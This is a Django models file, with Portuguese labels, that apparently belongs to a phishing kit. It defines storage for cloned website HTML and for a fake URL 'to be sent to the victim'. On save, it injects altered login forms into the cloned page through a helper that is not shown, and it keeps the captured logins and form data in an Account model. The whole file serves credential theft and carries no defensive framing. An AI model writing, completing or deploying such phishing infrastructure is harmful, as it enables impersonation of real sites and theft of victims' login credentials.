from django.db import models
from .utils import form_injection


# Create your models here.

class TemplateCopy(models.Model):
    """
    Onde será armazenado os templates
    """
    title = models.CharField(verbose_name='Título para esse conteúdo', max_length=30, unique=True)
    url_clonar_base = models.URLField(verbose_name='URL base do site clonado', max_length=500, blank=True, null=True, help_text="Se for somente o dominio, <span style='color:red;'>sempre coloque / no final, exemplo: https://dominio.com/</span>")
    url_clonar_page_especifica = models.URLField(verbose_name='URL da página especifica clonada', max_length=500, blank=True, null=True, help_text="Se for somente o dominio, <span style='color:red;'>sempre coloque / no final, exemplo: https://dominio.com/</span>")
    url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=500, unique=True, help_text="Ex: site.com/url/aqui/ -> <span style='color:red'>SEMPRE COLOQUE UMA BARRA NO FINAL !!!!!</span>")
    content = models.TextField(verbose_name='HTML da página', blank=True, null=True, help_text="Site para transformar uma imagem em base64 para usar no site sem precisar upar imagem: <a href='https://base64.guru/converter/encode/image' target='_blank'>https://base64.guru/converter/encode/image</a> -> Forma de uso: src='<span style='color:red;'>data:image/png;base64,COLAR_O_BASE64_AQUI</span>' ")
    redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')

    def __str__(self):
        return f"{self.title} - {self.url_clonar_base} - {self.url_fake}"
    
    def save(self, *args, **kwargs):
        html_new = form_injection(self.content, self.url_clonar_base)
        self.content = html_new
        return super().save()


class Account(models.Model):
    """
    Onde será armazenado os logins pegos
    """
    template = models.ForeignKey(verbose_name='Por qual template veio a informação', to=TemplateCopy, related_name='template', on_delete=models.DO_NOTHING)
    datas = models.TextField(verbose_name='Dados vindos do formulário', blank=True, null=True)
    url_path = models.TextField(verbose_name="URL completa de onde veio a informação", blank=True, null=True)

    def __str__(self):
        return f"{self.template.title} - {self.datas}"




